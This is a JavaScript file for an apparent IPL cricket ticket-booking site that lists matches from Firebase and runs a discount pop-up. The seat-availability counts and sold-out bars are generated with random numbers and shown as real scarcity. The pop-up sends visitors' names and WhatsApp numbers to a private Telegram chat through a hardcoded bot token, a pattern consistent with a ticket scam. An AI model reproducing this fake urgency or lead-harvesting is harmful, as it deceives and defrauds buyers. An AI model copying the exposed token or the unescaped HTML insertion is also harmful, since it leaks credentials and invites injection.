import { db, ref, onValue, push, set } from './firebase.js';

document.addEventListener('DOMContentLoaded', () => {

    const matchList = document.getElementById('match-list');  
    const eventTitle = document.getElementById('event-count-title');  
    const sortFilter = document.getElementById('sort-filter');  

    if (!matchList) return;  

    let matchesData = [];
    let globalBanner = ''; // Global settings variables
    let globalVenueImg = '';
    let globalFooterLogo = ''; // 🚀 NEW: Footer Logo variable
    let settingsLoaded = false; // 🚀 Bulletproof Flag

    // ==========================================
    // 🚀 TRANSLATOR (Short to Full Name)
    // ==========================================
    const teamFullName = {
        "CSK": "Chennai Super Kings",
        "MI": "Mumbai Indians",
        "RCB": "Royal Challengers Bengaluru",
        "KKR": "Kolkata Knight Riders",
        "SRH": "Sunrisers Hyderabad",
        "DC": "Delhi Capitals",
        "PBKS": "Punjab Kings",
        "RR": "Rajasthan Royals",
        "LSG": "Lucknow Super Giants",
        "GT": "Gujarat Titans"
    };

    function getFullName(shortName) {
        if (!shortName) return "";
        let cleanName = shortName.trim().toUpperCase();
        return teamFullName[cleanName] || shortName.trim(); 
    }

    // 🔥 ADDING ANIMATION STYLES DYNAMICALLY FOR FOMO
    if (!document.getElementById('fomo-animations')) {
        const fomoStyle = document.createElement('style');
        fomoStyle.id = 'fomo-animations';
        fomoStyle.innerHTML = `
            @keyframes pulse-fire {
                0% { transform: scale(1); opacity: 1; }
                50% { transform: scale(1.05); opacity: 0.8; }
                100% { transform: scale(1); opacity: 1; }
            }
            @keyframes grad-move {
                0% { background-position: 0% 50%; }
                50% { background-position: 100% 50%; }
                100% { background-position: 0% 50%; }
            }
            @keyframes hurry-move {
                0%, 100% { transform: translateX(0); }
                50% { transform: translateX(5px); }
            }
        `;
        document.head.appendChild(fomoStyle);
    }

    // ==========================================
    // 🌍 FETCH GLOBAL SETTINGS FIRST (Bulletproof)
    // ==========================================
    onValue(ref(db, 'settings/payment'), (snap) => {
        if (snap.exists()) {
            const settings = snap.val();
            globalBanner = settings.globalBanner || '';
            globalVenueImg = settings.globalVenue || '';
            globalFooterLogo = settings.globalFooterLogo || ''; // 🚀 Fetching Footer Logo
            
            // 🚀 DYNAMIC LOGO RENDER LOGIC
            const footerLogoImg = document.getElementById('dynamic-footer-logo');
            if (footerLogoImg && globalFooterLogo.trim() !== "") {
                footerLogoImg.src = globalFooterLogo;
                footerLogoImg.style.display = 'block'; // Logo milte hi show kar dega
            }
        }
        settingsLoaded = true; // Signal ready!
        
        // Agar matches pehle aa gaye the, toh ab unhe naye global image ke sath dikhao
        if (matchesData.length > 0) {
            renderMatches(matchesData);
        }
    });

    // ==========================================
    // 🔥 FETCH FROM FIREBASE
    // ==========================================
    onValue(ref(db, 'matches'), (snapshot) => {  

        matchList.innerHTML = '';  
        const data = snapshot.val();  

        if (!data) {  
            matchList.innerHTML = `<div class="loading">No Matches Found</div>`;  
            if (eventTitle) eventTitle.innerText = `0 Events`;
            return;  
        }  

        let allMatches = Object.keys(data).map(id => ({  
            id,  
            ...data[id]  
        }));  

        const today = new Date();
        today.setHours(0, 0, 0, 0); 

        const upcomingMatches = allMatches.filter(match => {
            const matchDate = new Date(match.date);
            matchDate.setHours(0, 0, 0, 0);
            return matchDate >= today; 
        });

        upcomingMatches.sort((a, b) => new Date(a.date) - new Date(b.date));
        matchesData = upcomingMatches;  
        
        // 🚀 Wait for settings before rendering
        if (settingsLoaded) {
            renderMatches(matchesData);  
        }
    });

    if (sortFilter) {
        sortFilter.addEventListener('change', () => {  
            let sorted = [...matchesData];  
            if (sortFilter.value === 'price-asc') {  
                sorted.sort((a, b) => (Number(a.price) || 0) - (Number(b.price) || 0));  
            } else {  
                sorted.sort((a, b) => new Date(a.date) - new Date(b.date));  
            }  
            renderMatches(sorted);  
        });
    }

    // ==========================================
    // 🔥 RENDER MATCHES
    // ==========================================
    function renderMatches(matches) {  

        matchList.innerHTML = '';  
        if (eventTitle) eventTitle.innerText = `${matches.length} Events`;  

        matches.forEach(match => {  

            const date = new Date(match.date);  
            const day = date.getDate() || '';  
            const month = date.toLocaleString('default', { month: 'short' });  
            const week = date.toLocaleString('default', { weekday: 'short' });  

            const venueString = match.venue || '';
            let stadiumName = venueString;
            let cityName = '';
            
            if (venueString.includes(',')) {
                const parts = venueString.split(',');
                stadiumName = parts[0].trim();
                cityName = parts[1].trim();
            } else if (venueString.includes(':')) {
                const parts = venueString.split(':');
                stadiumName = parts[0] ? parts[0].trim() : '';
                cityName = parts[1] ? parts[1].trim() : '';
            }

            const randomSeats = Math.floor(Math.random() * (400 - 85 + 1)) + 85; 
            const randomPercent = Math.floor(Math.random() * (95 - 75 + 1)) + 75;

            // 🚀 SMART TITLE TRANSLATION
            let rawTitle = match.title || '';
            let teamsArray = rawTitle.split(/\s+vs\s+|\s+v\s+|\s*-\s*/i);
            let teamA = teamsArray[0] ? getFullName(teamsArray[0]) : 'Team A';
            let teamB = teamsArray[1] ? getFullName(teamsArray[1]) : 'Team B';

            // 🚀 100% MASTER FORCE LOGIC: Agar Global Image set hai toh pakka wahi dikhegi!
            const finalBanner = (globalBanner && globalBanner.trim() !== "") ? globalBanner : match.banner;
            const finalVenueImg = (globalVenueImg && globalVenueImg.trim() !== "") ? globalVenueImg : match.venue_img;

            const div = document.createElement('div');  
            div.className = 'timeline-row';  

            div.innerHTML = `  
                <div class="timeline-left">  
                    <div class="date-val">${day}</div>  
                    <div class="month-val">${month}</div>  
                    <div class="day-val">${week}</div>  
                    <div class="city-val" style="font-size: 11px; color: #888; margin-top: 4px; font-weight: 500;">${cityName}</div>  
                </div>  

                <div class="timeline-right" style="width: 100%;">  
                    
                    <div style="background: linear-gradient(90deg, #ff416c, #ff4b2b, #ff416c); background-size: 200% 200%; animation: grad-move 2s ease infinite, hurry-move 1.5s ease-in-out infinite; color: white; font-size: 10px; font-weight: 800; padding: 4px 10px; border-radius: 4px; display: inline-block; margin-bottom: 12px; text-transform: uppercase; letter-spacing: 0.5px; box-shadow: 0 2px 5px rgba(255, 75, 43, 0.4);">
                        ⏳ Hurry! Seats Selling Out
                    </div>

                    <div class="teams-vs-ui" style="align-items: flex-start;">  
                        <div class="team-ui" style="text-align: center; width: 42%;">  
                            <img src="${match.team1 || ''}" onerror="this.src='https://via.placeholder.com/50'" style="margin-bottom: 5px;">
                            <span style="display: block; font-weight: 900; text-transform: uppercase; font-size: 11px; color: #000; font-style: italic; letter-spacing: 0.5px; line-height: 1.3;">${teamA}</span>  
                        </div>  
                        <div class="vs-circle" style="margin-top: 15px;">VS</div>  
                        <div class="team-ui" style="text-align: center; width: 42%;">  
                            <img src="${match.team2 || ''}" onerror="this.src='https://via.placeholder.com/50'" style="margin-bottom: 5px;">
                            <span style="display: block; font-weight: 900; text-transform: uppercase; font-size: 11px; color: #000; font-style: italic; letter-spacing: 0.5px; line-height: 1.3;">${teamB}</span>  
                        </div>  
                    </div>  
                    
                    <div class="venue-time" style="font-size: 12px; color: #555; margin-top: 15px;">  
                        ${match.time || ''} • ${stadiumName}  
                    </div>  

                    <div style="margin-top: 12px; background: #fff5f5; padding: 8px 10px; border-radius: 6px; border: 1px solid #ffe4e6;">
                        <div style="display: flex; justify-content: space-between; align-items: center; font-size: 10.5px; font-weight: 800; margin-bottom: 6px; white-space: nowrap;">
                            <span style="color: #e11d48; display: flex; align-items: center; gap: 4px; animation: pulse-fire 1.2s infinite; transform-origin: left center;">
                                🔥 Hot in demand
                            </span>
                            <span style="color: #be123c; margin-left: 5px;">ONLY ${randomSeats} LEFT!!</span>
                        </div>
                        <div style="background: #e2e8f0; height: 5px; border-radius: 10px; overflow: hidden;">
                            <div style="background: #e11d48; width: ${randomPercent}%; height: 100%; border-radius: 10px;"></div>
                        </div>
                    </div>

                    <div class="action-link" style="color: #f84464; font-size: 13px; font-weight: 600; margin-top: 12px;">
                        ₹${match.price || 0} Fast Filling. Book Now &gt;
                    </div>  
                </div>  
            `;  

            // 🔥 MATCH CARD CLICK -> OPEN MODAL 🔥
            div.addEventListener('click', () => {  
                const cleanMatch = {
                    id: match.id || "", title: match.title || "TBC vs TBC",
                    banner: finalBanner, venue_img: finalVenueImg,  
                    date: match.date || "", time: match.time || "",
                    venue: match.venue || "", price: match.price || 0,
                    team1: match.team1 || "", team2: match.team2 || ""
                };

                localStorage.setItem('selectedMatch', JSON.stringify(cleanMatch));  
                localStorage.setItem('matchId', match.id);  

                const modal = document.getElementById('discount-modal');
                if (modal) {
                    modal.style.display = 'flex';
                    setTimeout(() => modal.classList.add('active'), 10);
                } else {
                    window.location.href = 'event.html'; 
                }
            });

            matchList.appendChild(div);  
        });
    }

    // ==========================================
    // 🔥 DISCOUNT MODAL & TELEGRAM ALERT 🔥
    // ==========================================
    const claimBtn = document.getElementById('claim-btn');
    const skipBtn = document.getElementById('skip-discount');
    const closeModalBtn = document.getElementById('close-modal');
    const errorMsg = document.getElementById('lead-error');

    if(claimBtn) {
        claimBtn.addEventListener('click', async () => {
            const name = document.getElementById('lead-name').value.trim();
            const phone = document.getElementById('lead-phone').value.trim();

            if (name.length < 2 || phone.length < 10) {
                errorMsg.style.display = 'block';
                return;
            }

            errorMsg.style.display = 'none';
            claimBtn.innerText = 'Applying Discount...';
            claimBtn.style.background = '#94a3b8'; 
            claimBtn.disabled = true;

            const matchId = localStorage.getItem('matchId') || "N/A";
            const matchData = JSON.parse(localStorage.getItem('selectedMatch') || "{}");
            const matchTitle = matchData.title || matchId;

            // --- 🚀 1. SEND TELEGRAM MESSAGE ---
            const botToken = "8642950249:AAF8oxzhk-6NvYTEtpIW0oNNwsb2RQljliY"; 
            const chatId = "6820660513"; 
            
            const telegramMsg = `🚨 *NEW HOT LEAD! (HomePage)* 🚨\n\n` +
                                `👤 *Name:* ${name}\n` +
                                `📞 *WhatsApp:* ${phone}\n` +
                                `🏏 *Match:* ${matchTitle}\n` +
                                `💡 *Status:* Claimed ₹150 Discount`;

            const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(telegramMsg)}&parse_mode=Markdown`;

            try {
                await fetch(url);
            } catch (err) {
                console.log("Telegram alert failed");
            }

            // --- 🚀 2. SAVE TO FIREBASE ---
            try {
                const newLeadRef = push(ref(db, 'leads')); 
                await set(newLeadRef, {
                    name: name,
                    phone: phone,
                    match_id: matchId,
                    date: new Date().toISOString(),
                    status: 'lead_captured'
                });
            } catch (error) {
                console.log("Firebase save failed");
            }

            localStorage.setItem('customerName', name);
            localStorage.setItem('customerPhone', phone);
            localStorage.setItem('hasDiscount', 'true'); 

            window.location.href = 'event.html'; 
        });
    }

    const skipToEvent = () => {
        localStorage.setItem('hasDiscount', 'false'); 
        window.location.href = 'event.html';
    };

    if(skipBtn) skipBtn.addEventListener('click', skipToEvent);
    if(closeModalBtn) closeModalBtn.addEventListener('click', skipToEvent);

});
